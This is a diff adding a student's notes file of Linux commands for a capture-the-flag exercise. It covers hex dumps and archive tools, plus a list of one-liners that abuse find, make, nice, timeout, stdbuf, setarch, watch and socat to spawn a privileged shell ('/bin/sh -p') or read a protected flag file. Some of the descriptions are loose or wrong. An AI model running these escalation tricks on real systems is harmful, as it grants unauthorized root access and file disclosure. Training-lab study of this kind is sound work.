@@ -1,0 +1,61 @@
+emacs -->text editor
+rev --> reverseing string
+
+
+
+#Hex output
+
+od -bc filename  ---> od—> Octal, decimal, hex, ASCII dump
+hd filename ---> hexdump, mainly used to view the hexadecimal encoding of Binary files.
+xxd filename --->  Convert any file to hexadecimal or binary(-b) form
+
+
+base32  -—> echo 'some-base32-codings' | base32 -d can decode the base32 coding
+
+split filename --> split the file to the ‘xaa’ file default(1000row to split).
+
+
+# archive formats
+
+gzip filename (to compress) ---> to see the contents of the compressed file use zcat file.gz
+bzip2 filename (to compress) ---> to see the contents of the compressed file use bzcat file.bz2 or bzmore file.bz2
+zip file.zip file (to compress)
+ar r file.a file  (to compress)    --> to create or modify a backup file
+cpio -o, file,ctr+D   -—> used to backup file
+genisoimage -sort flag  --->  used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.
+
+
+
+
+# Enables you to read flags by making them execute other commands!
+
+env -i cat flag  ----> show environment variables that already exists in the system and executes instructions in the defined environment
+
+find . -exec /bin/sh -p \;
+
+
+make -f /dev/stdin <<<'all:;@cat flag' or make -s --eval=$'x:\n\t-'"/bin/sh -p"    --->  compile and install tools, manage project compilation issues
+
+nice -n 2 cat flag  or nice /bin/sh -p  ---> 
+
+timeout 7d /bin/sh -p   or   timeout 10s cat flag
+
+
+stdbuf -o0 cat flag  or stdbuf -i0 /bin/sh -p  —> modify the buffer mode and size of the standard stream
+
+
+setarch $(arch) cat flag   or setarch $(arch) /bin/sh -p   —>change reported architecture in new program environment and set personality flags
+
+	
+watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'   —> listen by timing the output of other commands to a terminal, repeat the command every 2 seconds
+
+socat -u FILE:flag STDOUT ----> It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.
+
+
+
+
+
+
+# Requires some light programming to read the flag.!
+
+whiptail --textbox --scrolltext flag 20 10  -->display dialog boxes from shell scripts
